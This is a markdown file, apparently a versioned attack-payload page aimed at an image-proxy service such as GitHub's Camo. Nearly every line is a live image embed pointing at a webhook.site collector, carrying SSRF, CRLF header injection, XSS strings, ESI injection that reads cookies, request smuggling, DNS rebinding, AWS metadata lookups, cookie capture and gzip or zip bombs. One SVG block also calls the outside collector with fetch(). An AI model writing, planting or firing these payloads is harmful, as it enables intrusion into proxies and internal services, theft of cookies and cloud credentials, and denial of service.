# v45: Advanced SSRF + Cache Poisoning + Response Manipulation

> Advanced attacks: Cache poisoning, response manipulation, time-based rebinding, ESI injection

---

## 1. Cache Poisoning - Stable URL Different Responses

### Test: Same URL fetched multiple times to detect caching behavior

![Cache Test 1](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/cache-test-v1.gif)

![Cache Test 2](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/cache-test-v1.gif)

![Cache Test 3](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/cache-test-v1.gif)

---

## 2. Content-Type Confusion

### Serve HTML disguised as image
![HTML as GIF](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/fake.gif?content=<script>alert(1)</script>)

### Serve JS disguised as image
![JS as GIF](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/fake.gif?content=alert(document.domain))

### SVG with XSS
![SVG XSS](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/xss.svg?content=<svg><script>alert(1)</script></svg>)

---

## 3. Response Header Injection (CRLF)

### Set-Cookie via CRLF
![CRLF Cookie](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/img.gif%0d%0aSet-Cookie:evil=1)

### Location header via CRLF
![CRLF Redirect](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/img.gif%0d%0aLocation:https://evil.com)

### X-XSS-Protection disable
![CRLF XSS](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/img.gif%0d%0aX-XSS-Protection:0)

### Content-Type override
![CRLF CT](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/img.gif%0d%0aContent-Type:text/html)

---

## 4. SVG Advanced SSRF

### foreignObject with fetch
```svg
<svg xmlns="http://www.w3.org/2000/svg">
  <foreignObject width="100%" height="100%">
    <body xmlns="http://www.w3.org/1999/xhtml">
      <script>fetch('https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/svg-fetch')</script>
    </body>
  </foreignObject>
</svg>
```

![SVG FO Fetch](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/svg-fo-fetch.svg)

### SVG with use + external stylesheet
![SVG Use Style](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/svg-use-style.svg)

### SVG image with CORS bypass attempt
![SVG CORS](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/svg-cors.svg)

---

## 5. Time-Based DNS Rebinding (Precise Timing)

### Fast rebind - 0 TTL
![0 TTL Rebind](https://f07a7e2a-c1c6-4810-8823-2d56f9e26bb8.rebind-0ttl.dnshook.site/rebind-0.gif)

### 1 second TTL rebind
![1s TTL Rebind](https://f07a7e2a-c1c6-4810-8823-2d56f9e26bb8.rebind-1s.dnshook.site/rebind-1s.gif)

### Race condition rebind
![Race Rebind](https://f07a7e2a-c1c6-4810-8823-2d56f9e26bb8.racerebind.dnshook.site/race.gif)

---

## 6. Cookie/Session Attacks

### Attempt to capture cookies from Camo
![Cookie Capture](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/capture-cookies.gif)

### Set-Cookie in webhook response (configured server-side)
![Set Cookie](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/set-cookie-response.gif)

---

## 7. Edge Side Includes (ESI) Injection

### Basic ESI include
![ESI Basic](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/esi.gif?data=<esi:include src="http://127.0.0.1/"/>)

### ESI with CDATA
![ESI CDATA](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/esi2.gif?data=<esi:include src="http://localhost/" />)

### ESI vars
![ESI Vars](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/esi3.gif?data=<esi:vars>$(HTTP_COOKIE)</esi:vars>)

---

## 8. X-Header Manipulation

### X-Forwarded-For to internal
![XFF Internal](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/xff.gif?xff=127.0.0.1)

### X-Original-URL for path override
![X-Original](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/xoriginal.gif)

### X-Rewrite-URL
![X-Rewrite](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/xrewrite.gif)

---

## 9. Protocol Smuggling in Image URLs

### HTTP/2 CRLF injection attempt
![H2 CRLF](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/h2.gif%0d%0aHost:internal)

### HTTP request smuggling via URL
![Smuggle](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/smuggle.gif?a=1%20HTTP/1.1%0d%0aHost:evil%0d%0a%0d%0aGET%20/admin)

### Chunked encoding trick
![Chunked](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/chunked.gif?Transfer-Encoding=chunked)

---

## 10. Polyglot Files

### GIF/JS polyglot
![Polyglot GIF-JS](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/polyglot-gifjs.gif)

### PNG/HTML polyglot
![Polyglot PNG-HTML](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/polyglot-pnghtml.png)

### JPEG/PHP polyglot
![Polyglot JPG-PHP](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/polyglot-jpgphp.jpg)

---

## 11. Blind SSRF via Timing

### Timeout-based internal detection
![Timeout 1](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/timeout-1.gif?delay=1)

![Timeout 5](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/timeout-5.gif?delay=5)

![Timeout 10](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/timeout-10.gif?delay=10)

---

## 12. URL Obfuscation Techniques

### Tab character in URL
![Tab URL](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/ta%09b.gif)

### Newline in URL
![Newline URL](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/new%0aline.gif)

### Null byte
![Null URL](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/null%00.gif)

### Backspace
![Backspace URL](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/back%08space.gif)

### Unicode right-to-left override
![RTL URL](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/rtl%E2%80%8F.gif)

---

## 13. IPv6 Advanced

### IPv6 zone ID
![IPv6 Zone](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/ipv6zone.gif?ip=[::1%25eth0])

### IPv6 scoped address
![IPv6 Scoped](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/ipv6scoped.gif?ip=[fe80::1%25lo0])

---

## 14. Parser Differential Exploitation

### Multiple @ symbols
![Multi At](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/multi-at.gif?url=http://a@b@127.0.0.1/)

### Mixed slashes
![Mixed Slash](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/mixed-slash.gif?url=http:/\127.0.0.1/)

### Colon variants
![Colon](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/colon.gif?url=http:127.0.0.1/)

### Triple slash
![Triple](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/triple.gif?url=http:///127.0.0.1/)

---

## 15. Hostname Tricks

### Localhost with port in subdomain
![Port Subdomain](https://127-0-0-1.nip.io:8080/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8.gif)

### AWS metadata via DNS
![AWS DNS](https://169.254.169.254.nip.io/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/aws.gif)

### Localhost alternatives
![Localtest](http://localtest.me/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/local.gif)

### IPv4 in IPv6 bracket
![v4inv6](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/v4inv6.gif?ip=[::127.0.0.1])

---

## 16. Gzip Bomb / Resource Exhaustion

### 10MB gzip that expands to 10GB
![Gzip Bomb](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/gzip-bomb.gz)

### Deflate bomb
![Deflate Bomb](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/deflate-bomb.deflate)

### Recursive archive
![Zip Bomb](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/zip-bomb.zip)

---

## 17. WebP/AVIF Modern Formats

### WebP with XMP metadata containing URL
![WebP XMP](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/xmp.webp)

### AVIF with SSRF payload
![AVIF SSRF](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/ssrf.avif)

### HEIC metadata
![HEIC Meta](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/meta.heic)

---

## 18. HTTP/3 QUIC Testing

### Alt-Svc header injection
![Alt-Svc](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/alt-svc.gif)

### QUIC protocol hint
![QUIC](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/quic.gif)

---

## 19. CORS/SOP Bypass Attempts

### Origin header manipulation
![Origin](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/origin.gif)

### Access-Control-* injection
![ACAO](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/acao.gif)

---

## 20. Webhook Response Variations

### Simple control (should work)
![Control](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/control.gif)

---

**v45 - Advanced SSRF, Cache Poisoning, Response Manipulation**
